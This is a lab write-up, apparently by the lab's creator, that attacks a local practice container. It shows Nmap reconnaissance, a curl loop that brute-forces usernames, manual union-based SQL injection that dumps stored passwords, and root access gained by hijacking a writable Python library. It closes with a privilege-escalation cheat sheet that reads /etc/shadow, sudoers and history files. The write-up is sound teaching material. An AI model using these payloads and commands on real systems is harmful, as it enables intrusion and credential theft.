As always, I begin by scanning ports and service, using Nmap with the following flags:

- `-p-` to scan all ports,
- `--open` to display only open ports and ignore those that are closed or filtered,
- `--min-rate 5000` to send a minimum of 5000 packets per second,
- `-n` to disable reverse DNS lookup,
- `-Pn` to assume the host is alive,
- `-sS` for a SYN scan, which is a stealth technique that does not complete TCP connections,
- `-vvv` for increased verbosity.

```
sudo nmap -p- --open --min-rate 5000 -n -Pn -sS 172.17.0.2 -oN logsnmap 
```

![[Pasted image 20240601171545.png]]

Only two ports were open, suggesting that the intrusion point is likely through the website. To gather more information, I used the WhatWeb tool.

```
whatweb http://172.17.0.2/ 
```

![[Pasted image 20240601171914.png]]

The output provided some details about the target, but nothing immediately useful for exploitation. Therefore, I decided to inspect the website in a browser.

![[Pasted image 20240601172447.png]]

The site appears to be a user search application with a note: "Avoid tools that automate; you learn more by doing it manually." The application seems to be designed to search for usernames input by the user.

![[Pasted image 20240601173039.png]]

I tried to search for the user "test" but got an alert saying "Unauthorized query." This is unusual because "test" is just a name, not some type of query or injection.

Additionally, I noticed that the form uses a GET method  to query the database and retrieve the user.

![[Pasted image 20240601173510.png]]
![[Pasted image 20240601173539.png]]

I immediately thought of inserting some SQL injection payloads into the URL or trying to inject something. Additionally, I considered brute-forcing the search application to find valid users in the system. However, before proceeding, I decided to further enumerate the website for hidden directories or files using FFUF or Dirsearch.

```
dirsearch -u 'http://172.17.0.2/' -w $fuzz -e php,txt,html
OR
ffuf -u 'http://172.17.0.2/FUZZ' -w $fuzz -e .php,.txt,.html
```

![[Pasted image 20240601174053.png]]
![[Pasted image 20240601174137.png]]

I found nothing initially, so I tried searching for more usernames. When I tried the username "admin," I obtained some credentials.

![[Pasted image 20240601174258.png]]

However, I couldn't find a login panel or any other application to use these credentials. Therefore, I thought they might be for the SSH service. Let's check.

![[Pasted image 20240601174634.png]]

These credentials are not for the SSH service, so now I'm unsure of their purpose.

While searching for usernames, I received an "Unauthorized query" alert. This suggested that there might be valid queries that could work, possibly indicating a SQL injection vulnerability. Since we were able to find the admin username, there might be other usernames we could discover. I wrote a small Bash one-liner to brute-force this application and try to retrieve more usernames.

```
while IFS= read -r username ;do echo -ne "\rTrying Username > $username >"; tput el; curl -s "http://172.17.0.2/?user=$username" | grep -q "Unauthorized" || echo " Username Found > $username"; done < /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
```

I discovered several usernames. However, when tested, most returned "No results found" rather than "Unauthorized query."

![[Pasted image 20240601182943.png]]

One particular username caught my attention: "select." To me, this doesn't seem like a regular username. As I mentioned before, this suggests an SQL injection vulnerability since "select" is a SQL query.

At this point, we have both credentials and a vulnerability. Let's exploit this SQL injection manually, as the first message suggests: "Avoid tools that automate; you learn more by doing it manually."

In SQL injection, we first need to confirm the vulnerability, determine the number of columns, and then inject queries.

When attempting to inject the typical query (`' or 1=1-- -`), we got an "Unauthorized query" alert.

![[Pasted image 20240601184441.png]]


Trying other queries resulted in the same alert, so I decided to experiment with '" order by". Surprisingly, this query yielded a "No results found" alert, indicating that it was allowed.

![[Pasted image 20240601184528.png]]

Let's determine the number of columns using this query:

- `' order by 4-- -`: This query didn't trigger the "No results found" alert.
- `' order by 3-- -`: This query did trigger the alert.

By experimenting with the alert that appears, I was able to ascertain the number of columns.

Now, let's play with the "union select" query:

- `' union select 1,2,3-- -`: This should display values if there are three columns.

![[Pasted image 20240601184927.png]]

- `' union select 1,database(),3-- -`: This should display the currently used database.
![[Pasted image 20240601184952.png]]

- `' union select 1,version(),3-- -`: This should display the MariaDB version.

![[Pasted image 20240601185039.png]]
- `' union select 1,schema_name,3 from information_schema.schemata-- -`: This should list the databases.

![[Pasted image 20240601185135.png]]

- `' union select 1,table_name,3 from information_schema.tables where table_schema='testdb'-- -`: This should enumerate the tables.

![[Pasted image 20240601185237.png]]


- `' union select 1,column_name,3 from information_schema.columns where table_schema='testdb' and table_name='users'-- -`: This should list the columns.

![[Pasted image 20240601185337.png]]

- `' union select 1,group_concat(username,':',password),3 from testdb.users-- -`: This should enumerate the usernames and passwords.

![[Pasted image 20240601185546.png]]


We obtained additional credentials through the SQL injection vulnerability. 
Using the username "kvzlx," we gained access to the server.

![[Pasted image 20240601185757.png]]

**Now its time to escalate privilege!!**

In the user's home directory, there is a Python script named "system_info.py" and a note. Upon checking permissions, we can execute and read this script.
![[Pasted image 20240601190059.png]]

This script,  utilizes the `psutil` library in Python to gather information about the system's virtual memory. There doesn't appear to be any obvious vulnerability in the script.

I explored other possibilities but found nothing noteworthy. Then, I checked the sudo permissions and discovered that the user "kvzlx" has the ability to execute the script "system_info.py" as root using sudo.

![[Pasted image 20240601190628.png]]

However, once more, it doesn't appear to be vulnerable.

**I've enumerated many things on this server, and I'm going to share a list of useful commands for escalating privileges at the end of this write-up.**

One useful command is the one that can find world-writable files:
` find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null `

After executing the previous command, we obtain something very useful
![[Pasted image 20240601194617.png]]

If we examine the script "system_info.py," we see that it imports the `psutil` module and utilizes the `virtual_memory()` function. Additionally, it's worth noting that we have write permissions for the `psutil/__init__.py` file.

This implies the potential for a Python Library Hijacking exploit. With write permissions to this library, we can inject commands that enable privilege escalation. Since any functional code we write within this library will be executed as root, given our root permissions to execute the "system_info.py" script, we can import the `os` module, if not already imported in the library, which allows us to execute system commands.

![[Pasted image 20240601195627.png]]
 
![[Pasted image 20240601195946.png]]

![[Pasted image 20240601200053.png]]

As seen in the previous image, we inserted the command "os.system('id')" into the "psutil" library. Therefore, when we run the "system_info.py" script with sudo privileges, it displays the result of the "ID" command for root, thus confirming the Python Library Hijacking.  Next, we can proceed to modify the library again to insert another command that provides us with a root shell.

![[Pasted image 20240601200705.png]]

![[Pasted image 20240601200727.png]]

**That's all for now! I hope you enjoyed it and learned as much as I did while creating this lab. Cheers! kvzlx.**

> [!NOTE]
> **Helpful Commands for Privilege Escalation!**
> ```bash
> #Current user Information
> id
> 
> # Kernel Version
> uname -a
> 
> #Current User INformation from /etc/passwd
> grep $USER /etc/passwd
> 
> # Most Recent Logins
> lastlog
> 
> #Last Logged On Users
> last
> 
> # All users including UID and GID Information
> for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done 
> 
> # List all UID 0(root) Accounts
> cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'
> 
> # Read passwd FIle
> cat /etc/passwd
> 
> # Check readability of the shadow file
> cat /etc/shadow
> 
> # What can we sudo without a password
> sudo -l
> 
> # Can we read the /etc/sudoers file
> cat /etc/sudoers
> 
> # Can we read roots .bash_history file
> cat /root/.bash_history
> 
> # Can we read any other user's .bash_history files
> find /home/* -name *.*history* - print 2> /dev/null
> 
> # Operating System
> cat /etc/issue
> cat /etc/*-release
> 
> # Can we sudo known binaries that allow breaking out into a shell
> sudo -l | grep vim
> sudo -l | grep nmap
> sudo -l | grep vi
> 
> # Can we list root's home directory
> ls -la /root/
> 
> # Curren $PATH environment variable
> echo $PATH
> 
> # List all cron jobs
> cat /etc/crontab && ls -la /etc/cron*
> 
> # Find world-writeable cron jobs
> find /etc/cron* -type f -perm -o+w -exec ls -l {} \;
> 
> # List running process
> ps auxwww
> 
> # List all processes running as root
> ps -u root
> 
> # List all processes running as current user
> ps -u $USER
> 
> # Find SUID files
> find / -perm -4000 -type f 2>/dev/null
> 
> # Find SUID files owned by root
> find / -uid 0 -perm -4000 -type f 2>/dev/null
> 
> # find GUID files
> find / -perm -2000 -type -f 2>/dev/null
> 
> # Find world-writable files
> find -perm -2 -type f 2>/dev/null
> 
> # List all conf files in /etc/
> ls -la /etc/*.conf
> 
> # Find conf files that contain the string "pass*"
> grep 'passw' /etc/*.conf
> 
> # List open files
> lsof -n
> 
> # List installed packages
> dpkg -l
> 
> # Common software versions
> sudo -V
> httpd -V
> apache2 -V
> mysql -V
> sendmail -d0.1
> 
> # Print process binaries/path and permissions
> ps aux | awk '{print $11}' | xargs -r ls -la 2>/dev/null | awk '!x[$0]++'
> 
> # Find world-writeable files
> find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
> 
> ```
> 
